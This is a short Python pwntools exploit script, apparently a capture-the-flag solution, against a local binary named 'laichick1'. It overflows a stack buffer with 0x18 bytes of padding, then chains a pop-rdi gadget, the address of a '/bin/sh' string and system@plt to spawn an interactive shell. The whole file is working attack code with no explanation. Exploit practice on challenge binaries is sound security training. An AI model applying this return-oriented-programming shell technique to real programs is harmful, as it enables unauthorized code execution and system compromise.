from pwn import *
# context.log_level = 'debug'

pop_rdi = 0x400753
binsh   = 0x4007ee

r = process('./laichick1')
e = ELF('./laichick1')

system_plt = e.plt['system']
payload = 'a'*0x18 + p64(pop_rdi) + p64(binsh) + p64(system_plt)

r.sendline(payload)
r.interactive()